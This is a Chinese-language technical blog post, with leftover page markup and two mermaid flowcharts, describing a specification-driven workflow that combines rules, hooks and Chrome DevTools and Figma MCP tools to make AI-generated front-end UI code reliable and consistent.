.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">核心协作流程图</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    %% 阶段 0: 启动与深度探测
    Start[输入原型 URL / 新页面需求] --&gt; HookB_Probe[激活 Hook B: 视觉协议桥接]
    
    subgraph MCP_Layer [MCP 感知层: AI 的五感]
        MCP_Nav[navigate_page: 访问原型]
        MCP_Snap[take_snapshot: DOM 审计]
        MCP_Shot[take_screenshot: 视觉采样]
    end

    HookB_Probe --&gt; MCP_Nav
    MCP_Nav --&gt; MCP_Snap
    MCP_Snap --&gt; MCP_Shot

    %% 阶段 1: Spec 生成与动态校准
    MCP_Shot --&gt; Spec_Gen[生成结构化 Spec &amp; Task.md]
    
    subgraph Dynamic_Alignment [动态校准闭环]
        Spec_Gen --&gt;|循环采样探测| MCP_Snap
        MCP_Snap --&gt;|特征反馈| Spec_Gen
    end

    %% 阶段 2: 规则注入
    Spec_Gen --&gt; Rules_Layer[Rules 注入: AI 驱动 UI 实现严格规范]
    
    subgraph Core_Rules [核心底线约束]
        R1[组件映射: FuncTable/DyForm]
        R2[视觉规范: Dark Mode/禁绿令]
        R3[架构模式: MVC 分离/i18n]
    end
    
    Rules_Layer -.-&gt; R1 &amp; R2 &amp; R3
    R1 &amp; R2 &amp; R3 -.-&gt;|微调任务细则| Spec_Gen

    %% 阶段 3: 增量任务执行
    Spec_Gen --&gt; Task_Anchor[配置环境锚点: 双网址锁定]
    Task_Anchor --&gt; Task_Exec[原子任务执行: 阶段 1-4]

    %% 阶段 4: 执行中的 Hook 校验
    subgraph Task_Hook [任务执行 UI Hook 闭环]
        T_Before[执行前: MCP 记录状态]
        T_Code[生成并应用代码]
        T_After[执行后: MCP 截图对比]
        
        T_Before --&gt; T_Code --&gt; T_After
    end

    Task_Exec --&gt; T_Before
    T_After --&gt;|存在偏差| T_Code
    T_After --&gt;|校验一致| Delivery[高质量交付 &amp; 代码合并]

    %% 样式定义
    style MCP_Layer fill:#e1f5fe,stroke:#01579b
    style Core_Rules fill:#fff3e0,stroke:#e65100
    style Task_Hook fill:#f3e5f5,stroke:#4a148c
    style Dynamic_Alignment stroke-dasharray: 5 5
</code></pre>
<h2 data-id="heading-1">一、 为什么 Spec 实践是 AI 开发质量的终极保证？</h2>
<p>在 AI 开发的早期，我们往往追求“一句话生成页面”。但回到真实的业务场景，这种方式产出的代码几乎不可用。AI 会产生严重的<strong>幻觉</strong>，或者为了追求视觉一致性而进行无意义的<strong>过度设计</strong>。</p>
<p>通过 <strong>Spec-Coding (规范驱动)</strong> 协议的实践，我们并不是在寻找一种“最聪明”的模型，而是构建一套<strong>质量与效率的确定性底线</strong>：</p>
<ul>
<li><strong>消除幻觉约束</strong>：Spec 为 AI 提供了清晰的操作边界，防止其随意引入非标库、手写原生 HTML 或滥用内联样式。</li>
<li><strong>解决逻辑断层</strong>：通过预定义的架构协议，确保 AI 生成的代码逻辑自洽，而非一堆无法运行的 UI 占位符。</li>
<li><strong>规模化交付的共性</strong>：当团队所有 AI 开发都遵循同一套 Spec，产出的代码在可维护性和一致性上能达到高度统一，避免了“千人千面”的代码污染。</li>
</ul>
<hr/>
<h2 data-id="heading-2">二、 核心架构：Rules, Hook &amp; MCP 的协同链路</h2>
<p>该方案的可行性核心在于将“人眼识别的规范”转化为“机器执行的自动化指令”。我们建立了一份**《AI 驱动：UI 实现与任务执行严格规范》**作为核心指导文档。其底层逻辑如下：</p>
<h3 data-id="heading-3">1. 协作流程图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[原型输入 URL/链接] --&gt; B{是否有 Figma 设计稿?}
    B -- 无 Figma / 只有原型 --&gt; C[激活 Hook B: 深度探测]
    B -- 有 Figma --&gt; D[DLS 变量映射 &amp; 截图还原]
    
    C --&gt; E[MCP Chrome DevTools]
    E --&gt; F[核心意图识别]
    
    F --&gt; G[生成结构化 Spec &amp; Task.md]
    G -.-&gt;|不断调用 MCP 采样校验| E
    
    G --&gt; H[Rules 约束注入: UI 实现严格规范]
    H -.-&gt;|根据规范微调任务细则| G
    
    H --&gt; I[原子任务执行]
    I --&gt; J[Hook A: 合规性自检]
    J --&gt; K[MCP 循环校验]
    
    K -- 视觉/代码偏差 --&gt; I
    K -- 校验通过 --&gt; L[高质量交付]
</code></pre>
<h3 data-id="heading-4">2. 三大支柱的职责分工</h3>
<ul>
<li><strong>Rules (规则层)</strong> ：以《AI 驱动：UI 实现与任务执行严格规范》为准则，定义了视觉底线、组件映射规则（如强制复用标准表格/表单组件）以及架构模式（如 MVC 分离），确保 AI 输出不偏离团队基建。</li>
<li><strong>Hook (钩子层)</strong> ：作为“拦截器”，在代码写入前校验组件复用、样式原子化及请求模式，并负责从视觉信号到开发任务的翻译。</li>
<li><strong>MCP (能力层)</strong> ：赋予 AI “五感”。通过 <strong>Chrome DevTools MCP</strong>，让 AI 能够实时感知浏览器真实的运行环境，解决“盲目编码”带来的视觉与逻辑偏差。</li>
</ul>
<hr/>
<h2 data-id="heading-5">三、 深度实践中的难点与破解之道</h2>
<p>在跑通这一链路的过程中，我们重点攻克了几个令开发者头疼的工程难题：</p>
<h3 data-id="heading-6">1. 解决 UI 还原与组件抽象的冲突</h3>
<ul>
<li><strong>难点</strong>：AI 倾向于通过堆砌 CSS 实现像素级还原，这往往导致嵌套极深、难以维护。</li>
<li><strong>解决</strong>：利用 <strong>MCP 视觉审计</strong>，将页面拆解为组件树。AI 必须先确认布局重心，再应用 Rules 进行组件映射。这意味着 AI 会优先思考“这里该用哪个公共组件”，而不是“这里该写哪个 CSS 属性”。</li>
</ul>
<h3 data-id="heading-7">2. 规避代码不可用与逻辑空洞</h3>
<ul>
<li><strong>难点</strong>：生成的代码往往缺失 Loading、Error 处理或 API 链路不通。</li>
<li><strong>解决</strong>：实施 <strong>“环境锚点”强制化</strong>。在 Task 顶部锁定预览地址，AI 在生成每一阶段逻辑后，必须通过 MCP 回访页面验证交互是否闭环，而非一次性“盲写”到底。</li>
</ul>
<h3 data-id="heading-8">3. 处理“只有原型，没有设计稿”的极端情况</h3>
<p>这是最能体现方案可行性的场景。当手中只有一个运行中的 Web 原型 URL 时，通过 <strong>Hook B 驱动 MCP 探测</strong>，AI 能自动提取 DOM 结构和交互链路，生成高度还原的 Spec。这在老旧项目重构或竞品分析场景下极大地降低了 UI 逆向工程的成本。</p>
<hr/>
<h2 data-id="heading-9">四、 两种实践路径的体验总结</h2>
<h3 data-id="heading-10">场景 A：无 Figma，只有 Web 原型 (对齐模式)</h3>
<p>在这种场景下，我们通过 <strong>Chrome DevTools MCP</strong> 强行补齐了信息差。AI 通过“观察”原型的 Spacing 节奏和交互反馈，实现了高保真的代码重构。虽然过程涉及多轮 Hook 校验，但产出的代码健壮性远超人工手动临摹。</p>
<h3 data-id="heading-11">场景 B：基于 Figma (MCP 驱动模式)</h3>
<p>当拥有 Figma 时，通过<strong>Figma MCP</strong>的<strong>DLS (Design Language System) 变量</strong>与截图，还原度可直接达到 95% 以上。此时 AI 的工作重心不再是像素，而是转向 <strong>Rules 合规性</strong>，重点确保 API 请求模式、控制器逻辑完全符合团队的工程标准。</p>
<hr/>
<h2 data-id="heading-12">五、 总结：AI 开发的本质是协议的胜利</h2>
<p>通过本次实践，我们发现：如果说大模型的能力决定了生成的<strong>上限</strong>，那么严密的协议则决定了交付的<strong>下限</strong>。协议的作用，是让 AI 在处理复杂业务时，从<strong>随机的灵感闪现</strong>转化为<strong>稳定的工程输出</strong>。</p>
<p>折腾完这一整套体系后，最直观的感受是：AI 编程终于从‘抽卡撞运气’变成了‘照方抓药’。当模型能力（智商）足够强时，这套 Spec 就像是一条工业传送带，把 AI 那些天马行空的幻觉收拢进工程规范里。毕竟对我们业务开发来说，一个听话、稳定、不乱写代码的 AI，远比一个偶尔能写出‘神来之笔’但大多时候在挖坑的 AI 要靠谱得多</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>